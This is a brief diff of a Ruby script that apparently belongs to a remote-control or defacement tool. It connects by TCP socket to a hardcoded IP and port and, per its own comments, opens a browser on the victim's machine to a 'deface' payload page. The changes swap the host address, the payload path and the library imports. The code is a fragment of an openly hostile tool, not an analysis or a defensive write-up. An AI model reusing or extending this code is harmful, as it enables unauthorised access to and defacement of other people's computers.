@@ -1,13 +1,9 @@
 #!/usr/bin/ruby
 
 require "socket"
-require "open3"
-require "launchy"
-require "ipinfo"
+require_relative "launchy/lib/launchy"
 
-include Ipinfo
-
-host = "192.168.1.105"
+host = "192.168.1.101"
 port = "8001"
 
 s = TCPSocket.open(host, port)
@@ -36,7 +32,7 @@ begin
         #time to open browser :D
         sleep(5)
         #Address your deface :DDDD
-        Launchy.open("file:///home/virus007/Desktop/deface.html")
+        Launchy.open("/root/Desktop/sia-payload/deface.html")
       end
   end
   
